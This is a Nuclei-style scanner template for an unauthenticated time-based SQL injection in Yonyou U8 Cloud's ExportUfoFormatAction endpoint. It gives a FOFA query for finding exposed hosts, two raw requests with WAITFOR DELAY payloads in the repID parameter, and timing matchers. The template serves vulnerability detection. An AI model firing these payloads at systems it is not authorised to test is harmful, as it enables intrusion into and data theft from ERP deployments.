id: yongyouU8-Cloud-ExportUfoFormatAction-sql-XVE-2024-4626

info:
  name: 用友U8 Cloud ExportUfoFormatAction SQL延时注入漏洞(XVE-2024-4626)
  author: Superhero
  severity: high
  description: |-
    fofa: app="用友-U8-Cloud"
    用友U8 Cloud ExportUfoFormatAction 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488142&idx=1&sn=af2f73aa9df9fe6d2cb1acd53d0965f8&chksm=c267a7bdf5102eab62affe8d2fab9d4defd99ed6c9547b68b3c9f511f93347124615003992f8&token=1431500657&lang=zh_CN#rd
  tags: sql injection



http:
  - raw:
      - |
        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:4%27--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0

      - |
        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:8%27--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and


 




